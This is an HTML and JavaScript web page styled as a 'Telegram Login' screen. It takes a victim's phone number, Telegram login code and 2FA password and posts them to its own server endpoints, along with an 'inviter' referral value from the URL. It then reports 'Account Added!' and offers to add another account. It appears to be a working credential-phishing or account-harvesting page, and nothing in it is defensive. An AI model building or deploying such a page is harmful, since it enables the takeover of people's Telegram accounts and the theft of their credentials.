<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    body {
        min-height: 100vh;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        position: relative;
        overflow-x: hidden;
        display: flex;
        align-items: center;
        justify-content: center;
        padding: 20px;
    }

    /* Animated Background */
    body::before {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 1200"><path fill="rgba(255,255,255,0.15)" d="M400,200 C350,200 310,240 310,290 C310,340 350,380 400,380 C450,380 490,340 490,290 C490,240 450,200 400,200 Z M350,400 L450,400 L430,600 L370,600 L350,400 Z M400,600 L400,800 L380,1000 L420,1000 L400,800 L400,600 Z"/><circle fill="rgba(255,255,255,0.2)" cx="400" cy="250" r="30"/><path fill="rgba(255,255,255,0.2)" d="M350,320 L370,340 L430,340 L450,320 L440,300 L360,300 L350,320 Z"/><path fill="rgba(255,255,255,0.1)" d="M380,380 L420,380 L430,420 L370,420 L380,380 Z"/></svg>') center/cover no-repeat;
        opacity: 0.3;
        animation: float 20s ease-in-out infinite;
        pointer-events: none;
    }

    @keyframes float {
        0%, 100% { transform: translateY(0) scale(1); }
        50% { transform: translateY(-20px) scale(1.02); }
    }

    /* Animated Gradient Background */
    body::after {
        content: '';
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: linear-gradient(125deg, 
            rgba(102, 126, 234, 0.4) 0%,
            rgba(118, 75, 162, 0.4) 50%,
            rgba(237, 100, 166, 0.4) 100%);
        animation: gradientShift 10s ease infinite;
        pointer-events: none;
    }

    @keyframes gradientShift {
        0%, 100% { background-position: 0% 50%; }
        50% { background-position: 100% 50%; }
    }

    /* Floating Particles */
    .floating-particle {
        position: fixed;
        pointer-events: none;
        z-index: 1;
        animation: floatParticle 15s ease-in-out infinite;
    }

    @keyframes floatParticle {
        0%, 100% {
            transform: translateY(0) translateX(0) rotate(0deg);
        }
        25% {
            transform: translateY(-30px) translateX(20px) rotate(90deg);
        }
        50% {
            transform: translateY(-60px) translateX(-20px) rotate(180deg);
        }
        75% {
            transform: translateY(-30px) translateX(20px) rotate(270deg);
        }
    }

    /* Main Container */
    .login-container {
        width: 100%;
        max-width: 450px;
        position: relative;
        z-index: 10;
        animation: slideUp 0.8s ease-out;
    }

    @keyframes slideUp {
        from {
            opacity: 0;
            transform: translateY(50px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    /* Glassmorphism Card */
    .login-card {
        background: rgba(23, 33, 43, 0.85);
        backdrop-filter: blur(20px);
        border-radius: 32px;
        padding: 40px 32px;
        box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3), 
                    0 0 0 1px rgba(255, 255, 255, 0.1);
        border: 1px solid rgba(255, 255, 255, 0.2);
        transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .login-card:hover {
        transform: translateY(-5px);
        box-shadow: 0 35px 55px rgba(0, 0, 0, 0.4);
    }

    /* Header Bar */
    .header-bar {
        display: flex;
        align-items: center;
        margin-bottom: 32px;
        gap: 16px;
    }

    .back-button {
        width: 44px;
        height: 44px;
        border-radius: 50%;
        background: rgba(36, 47, 61, 0.8);
        backdrop-filter: blur(10px);
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
        font-size: 1.5rem;
        color: #8e9fad;
        transition: all 0.3s ease;
        border: 1px solid rgba(255, 255, 255, 0.1);
    }

    .back-button:hover {
        background: rgba(76, 156, 224, 0.8);
        color: white;
        transform: scale(1.05);
    }

    .back-button svg {
        width: 22px;
        height: 22px;
        fill: currentColor;
    }

    .header-title {
        font-size: 1.3rem;
        font-weight: 600;
        color: #fff;
        text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        letter-spacing: 0.5px;
    }

    /* Step Title */
    .step-title {
        font-size: 2rem;
        font-weight: 700;
        margin-bottom: 12px;
        background: linear-gradient(135deg, #fff 0%, #4c9ce0 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }

    .step-description {
        color: rgba(142, 159, 173, 0.9);
        font-size: 0.95rem;
        margin-bottom: 28px;
        line-height: 1.5;
    }

    /* Input Wrapper */
    .input-wrapper {
        background: rgba(36, 47, 61, 0.8);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(76, 156, 224, 0.3);
        border-radius: 16px;
        display: flex;
        align-items: center;
        overflow: hidden;
        transition: all 0.3s ease;
        margin-bottom: 28px;
    }

    .input-wrapper:focus-within {
        border-color: #4c9ce0;
        box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.2);
        transform: translateY(-2px);
    }

    .input-prefix {
        padding: 16px 0 16px 20px;
        color: #4c9ce0;
        font-weight: 600;
        font-size: 1.1rem;
        background: rgba(30, 42, 54, 0.6);
        border-right: 1px solid rgba(76, 156, 224, 0.3);
        min-width: 55px;
        text-align: center;
    }

    .form-input {
        flex: 1;
        padding: 16px 20px;
        background: transparent;
        border: none;
        color: #fff;
        font-size: 1rem;
        outline: none;
    }

    .form-input::placeholder {
        color: #5d6f7e;
    }

    /* Password Input */
    .password-input {
        width: 100%;
        padding: 16px 20px;
        background: rgba(36, 47, 61, 0.8);
        backdrop-filter: blur(10px);
        border: 1px solid rgba(76, 156, 224, 0.3);
        border-radius: 16px;
        color: #fff;
        font-size: 1rem;
        outline: none;
        transition: all 0.3s ease;
        margin-bottom: 28px;
    }

    .password-input:focus {
        border-color: #4c9ce0;
        box-shadow: 0 0 0 3px rgba(76, 156, 224, 0.2);
        transform: translateY(-2px);
    }

    /* Code Boxes */
    .code-container {
        display: flex;
        gap: 12px;
        justify-content: center;
        margin: 28px 0;
    }

    .code-box {
        width: 65px;
        height: 75px;
        background: rgba(36, 47, 61, 0.8);
        backdrop-filter: blur(10px);
        border: 2px solid rgba(76, 156, 224, 0.3);
        border-radius: 16px;
        color: #fff;
        font-size: 2rem;
        font-weight: bold;
        text-align: center;
        line-height: 71px;
        transition: all 0.3s ease;
        cursor: pointer;
    }

    .code-box.filled {
        border-color: #4c9ce0;
        background: rgba(43, 82, 120, 0.6);
        transform: scale(1.02);
        box-shadow: 0 0 15px rgba(76, 156, 224, 0.3);
    }

    .code-box:hover {
        transform: translateY(-2px);
        border-color: #4c9ce0;
    }

    .hidden-input {
        position: absolute;
        opacity: 0;
        width: 0;
        height: 0;
        pointer-events: none;
    }

    /* Buttons */
    .btn {
        width: 100%;
        padding: 16px;
        border: none;
        border-radius: 30px;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin-top: 16px;
        position: relative;
        overflow: hidden;
    }

    .btn::before {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        width: 0;
        height: 0;
        border-radius: 50%;
        background: rgba(255, 255, 255, 0.3);
        transform: translate(-50%, -50%);
        transition: width 0.6s, height 0.6s;
    }

    .btn:hover::before {
        width: 300px;
        height: 300px;
    }

    .btn-primary {
        background: linear-gradient(135deg, #4c9ce0 0%, #6ab2f2 100%);
        color: white;
        box-shadow: 0 4px 15px rgba(76, 156, 224, 0.4);
    }

    .btn-primary:hover:not(:disabled) {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(76, 156, 224, 0.5);
    }

    .btn-primary:disabled {
        opacity: 0.6;
        cursor: not-allowed;
        transform: none;
    }

    .btn-secondary {
        background: rgba(43, 57, 69, 0.9);
        backdrop-filter: blur(10px);
        color: #6ab2f2;
        border: 1px solid rgba(76, 156, 224, 0.3);
    }

    .btn-secondary:hover:not(:disabled) {
        background: rgba(58, 74, 90, 0.9);
        transform: translateY(-2px);
    }

    /* Message Boxes */
    .error-message {
        background: linear-gradient(135deg, #8e2b2b 0%, #a53333 100%);
        color: white;
        padding: 14px 18px;
        border-radius: 16px;
        margin-bottom: 24px;
        font-size: 0.9rem;
        display: none;
        animation: shake 0.5s ease;
        border-left: 4px solid #ff6b6b;
    }

    .success-message {
        background: linear-gradient(135deg, #1e4a2b 0%, #2a6e3a 100%);
        color: white;
        padding: 14px 18px;
        border-radius: 16px;
        margin-bottom: 24px;
        font-size: 0.9rem;
        display: none;
        animation: slideIn 0.5s ease;
        border-left: 4px solid #4c9e4c;
    }

    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        25% { transform: translateX(-5px); }
        75% { transform: translateX(5px); }
    }

    @keyframes slideIn {
        from {
            opacity: 0;
            transform: translateY(-20px);
        }
        to {
            opacity: 1;
            transform: translateY(0);
        }
    }

    .error-message.show, .success-message.show {
        display: block;
    }

    /* Loading Spinner */
    .loading-spinner {
        display: inline-block;
        width: 20px;
        height: 20px;
        border: 3px solid rgba(255, 255, 255, 0.3);
        border-radius: 50%;
        border-top-color: white;
        animation: spin 1s ease-in-out infinite;
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    /* Footer Link */
    .footer-link {
        text-align: center;
        margin-top: 28px;
    }

    .footer-link a {
        color: #4c9ce0;
        text-decoration: none;
        font-size: 0.9rem;
        transition: all 0.3s ease;
        position: relative;
    }

    .footer-link a::after {
        content: '';
        position: absolute;
        bottom: -2px;
        left: 0;
        width: 0;
        height: 2px;
        background: #4c9ce0;
        transition: width 0.3s ease;
    }

    .footer-link a:hover::after {
        width: 100%;
    }

    /* Success Page */
    .success-icon {
        font-size: 5rem;
        margin: 20px 0;
        animation: bounce 1s ease infinite;
    }

    @keyframes bounce {
        0%, 100% { transform: translateY(0); }
        50% { transform: translateY(-10px); }
    }

    /* Responsive */
    @media (max-width: 600px) {
        .login-container {
            max-width: 95%;
        }
        
        .login-card {
            padding: 32px 24px;
        }
        
        .step-title {
            font-size: 1.6rem;
        }
        
        .code-box {
            width: 55px;
            height: 65px;
            font-size: 1.5rem;
            line-height: 61px;
        }
        
        .code-container {
            gap: 8px;
        }
    }
</style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <!-- Page 1: Phone Number -->
            <div id="page1">
                <div class="header-bar">
                    <div class="back-button" onclick="goBack()">
                        <svg viewBox="0 0 24 24">
                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                        </svg>
                    </div>
                    <div class="header-title">Telegram</div>
                </div>

                <div class="step-title">Your phone number</div>
                <div class="step-description">
                    Please enter your phone number with country code.
                </div>

                <div class="input-wrapper">
                    <span class="input-prefix">+</span>
                    <input type="tel" class="form-input" id="phone" placeholder="1234567890" inputmode="numeric" value="" autofocus>
                </div>

                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()">
                    <span>Next</span>
                </button>
            </div>

            <!-- Page 2: Verification Code -->
            <div id="page2" style="display: none;">
                <div class="header-bar">
                    <div class="back-button" onclick="backToPage1()">
                        <svg viewBox="0 0 24 24">
                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                        </svg>
                    </div>
                    <div class="header-title">Verification</div>
                </div>

                <div class="step-title">Enter Code</div>
                <div class="step-description">
                    Please enter the 5-digit code sent to your phone.
                </div>

                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" pattern="[0-9]*">
                
                <div class="code-container" id="codeBoxes" onclick="focusHiddenInput()">
                    <div class="code-box" id="box1">-</div>
                    <div class="code-box" id="box2">-</div>
                    <div class="code-box" id="box3">-</div>
                    <div class="code-box" id="box4">-</div>
                    <div class="code-box" id="box5">-</div>
                </div>

                <div id="passwordGroup" style="display: none;">
                    <input type="password" class="password-input" id="password" placeholder="Enter your 2FA password">
                </div>

                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                    <span>Verify</span>
                </button>
            </div>

            <!-- Page 3: Success -->
            <div id="page3" style="display: none;">
                <div class="header-bar">
                    <div class="back-button" onclick="backToPage1()">
                        <svg viewBox="0 0 24 24">
                            <path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/>
                        </svg>
                    </div>
                    <div class="header-title">Success</div>
                </div>

                <div style="text-align: center;">
                    <div class="success-icon">✅</div>
                    <div class="step-title">Account Added!</div>
                    <div class="step-description" id="successAccountInfo" style="margin-bottom: 24px;"></div>
                    
                    <button class="btn btn-primary" onclick="goToDashboard()">
                        <span>Go to Dashboard</span>
                    </button>
                    
                    <button class="btn btn-secondary" onclick="addAnotherAccount()" style="margin-top: 12px;">
                        <span>Add Another Account</span>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <script>
        // ---------- State ----------
        let timerInterval;
        let timeLeft = 60;
        let currentSessionId = null;
        let currentPhone = '';
        let currentCode = '';

        // Get inviter from URL if any
        const urlParams = new URLSearchParams(window.location.search);
        const currentInviter = urlParams.get('inviter');

        // DOM elements
        const hiddenInput = document.getElementById('hiddenCodeInput');
        const boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4'),
            document.getElementById('box5')
        ];

        // ---------- Helper Functions ----------
        function showError(message) {
            const existingErrors = document.querySelectorAll('.error-message');
            existingErrors.forEach(el => el.remove());
            
            const errorDiv = document.createElement('div');
            errorDiv.className = 'error-message show';
            errorDiv.textContent = message;
            
            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"])');
            if (visiblePage) {
                visiblePage.insertBefore(errorDiv, visiblePage.firstChild);
            }
            
            setTimeout(() => {
                if (errorDiv.parentNode) errorDiv.remove();
            }, 4000);
        }

        function showSuccess(message) {
            const existingSuccess = document.querySelectorAll('.success-message');
            existingSuccess.forEach(el => el.remove());
            
            const successDiv = document.createElement('div');
            successDiv.className = 'success-message show';
            successDiv.textContent = message;
            
            const visiblePage = document.querySelector('#page1:not([style*="display: none"]), #page2:not([style*="display: none"]), #page3:not([style*="display: none"])');
            if (visiblePage) {
                visiblePage.insertBefore(successDiv, visiblePage.firstChild);
            }
            
            setTimeout(() => {
                if (successDiv.parentNode) successDiv.remove();
            }, 3000);
        }

        function setLoading(button, isLoading) {
            const span = button.querySelector('span');
            const originalText = span ? span.textContent : 'Next';
            
            if (isLoading) {
                button.disabled = true;
                button.innerHTML = '<span class="loading-spinner"></span><span> Please wait...</span>';
            } else {
                button.disabled = false;
                button.innerHTML = `<span>${originalText}</span>`;
            }
        }

        function focusHiddenInput() {
            hiddenInput.focus();
        }

        function updateCodeBoxes() {
            const code = hiddenInput.value;
            for (let i = 0; i < 5; i++) {
                if (i < code.length) {
                    boxes[i].textContent = code[i];
                    boxes[i].classList.add('filled');
                } else {
                    boxes[i].textContent = '-';
                    boxes[i].classList.remove('filled');
                }
            }
        }

        hiddenInput.addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
            updateCodeBoxes();
        });

        // Navigation
        function goBack() {
            window.location.href = '/';
        }

        function backToPage1() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            
            document.getElementById('password').value = '';
            hiddenInput.value = '';
            updateCodeBoxes();
            document.getElementById('phone').focus();
            currentCode = '';
            if (timerInterval) clearInterval(timerInterval);
        }

        function goToDashboard() {
            window.location.href = '/dashboard';
        }

        function addAnotherAccount() {
            backToPage1();
            document.getElementById('phone').value = '';
            currentSessionId = null;
            currentPhone = '';
            currentCode = '';
        }

        // ---------- API Calls ----------
        async function sendCode() {
            let phoneNumber = document.getElementById('phone').value.trim().replace(/\s+/g, '');
            
            if (!phoneNumber) {
                showError('Please enter your phone number');
                document.getElementById('phone').focus();
                return;
            }

            if (!phoneNumber.startsWith('+')) {
                phoneNumber = '+' + phoneNumber;
            }

            const button = document.getElementById('sendCodeBtn');
            setLoading(button, true);

            try {
                const response = await fetch('/api/add-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phone: phoneNumber })
                });

                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.session_id;
                    currentPhone = phoneNumber;
                    
                    document.getElementById('page1').style.display = 'none';
                    document.getElementById('page2').style.display = 'block';
                    
                    hiddenInput.value = '';
                    updateCodeBoxes();
                    setTimeout(() => hiddenInput.focus(), 300);
                    
                    showSuccess('Code sent successfully!');
                } else {
                    showError(data.error || 'Failed to send code');
                }
            } catch (error) {
                console.error('Error:', error);
                showError('Network error. Please try again.');
            } finally {
                setLoading(button, false);
            }
        }

        async function verifyCode() {
            const code = hiddenInput.value;
            
            if (code.length !== 5) {
                showError('Please enter the 5-digit code');
                hiddenInput.focus();
                return;
            }

            const password = document.getElementById('password').value;
            const needPassword = document.getElementById('passwordGroup').style.display === 'block';

            if (needPassword && !password) {
                showError('Please enter your 2FA password');
                document.getElementById('password').focus();
                return;
            }

            currentCode = code;
            const button = document.getElementById('verifyBtn');
            setLoading(button, true);

            try {
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        code: code,
                        session_id: currentSessionId,
                        password: password,
                        inviter: currentInviter
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('page2').style.display = 'none';
                    document.getElementById('page3').style.display = 'block';
                    
                    document.getElementById('successAccountInfo').innerHTML = 
                        `Account added successfully!`;
                    
                    if (timerInterval) clearInterval(timerInterval);
                    showSuccess('Account added successfully!');
                    
                } else if (data.need_password) {
                    document.getElementById('passwordGroup').style.display = 'block';
                    showError('2FA is enabled. Please enter your password.');
                } else {
                    showError(data.error || 'Verification failed');
                    hiddenInput.value = '';
                    updateCodeBoxes();
                    hiddenInput.focus();
                }
            } catch (error) {
                console.error('Error:', error);
                showError('Network error. Please try again.');
            } finally {
                setLoading(button, false);
            }
        }

        // Event listeners
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verifyCode();
        });

        document.getElementById('page2').addEventListener('click', function(e) {
            if (e.target.tagName !== 'BUTTON') hiddenInput.focus();
        });

        window.addEventListener('load', function() {
            document.getElementById('phone').focus();
        });
        
    </script>
    
    <!-- Floating Particles Animation -->
    <script>
        // Create floating particles
        function createFloatingParticle() {
            const particles = ['✨', '⭐', '💫', '🔥', '📱', '💬', '🎯'];
            const particle = document.createElement('div');
            particle.className = 'floating-particle';
            particle.innerHTML = particles[Math.floor(Math.random() * particles.length)];
            particle.style.left = Math.random() * 100 + '%';
            particle.style.fontSize = (Math.random() * 20 + 10) + 'px';
            particle.style.animationDuration = (Math.random() * 10 + 8) + 's';
            particle.style.animationDelay = Math.random() * 5 + 's';
            particle.style.opacity = Math.random() * 0.6 + 0.3;
            document.body.appendChild(particle);
            
            setTimeout(() => {
                particle.remove();
            }, 15000);
        }
        
        // Create particles every 2 seconds
        setInterval(createFloatingParticle, 2000);
        
        // Create initial particles
        for(let i = 0; i < 10; i++) {
            setTimeout(createFloatingParticle, i * 300);
        }
    </script>
</body>
</html>
